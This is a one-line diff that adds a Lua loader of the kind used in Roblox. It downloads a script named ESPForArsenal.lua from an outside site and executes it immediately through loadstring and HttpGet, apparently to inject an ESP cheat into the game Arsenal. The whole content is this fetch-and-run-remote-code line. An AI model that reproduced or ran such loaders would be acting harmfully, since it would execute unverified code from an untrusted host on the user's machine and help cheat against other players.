@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://scriptstream.xyz/ScriptStorage/ESPForArsenal.lua", true))()
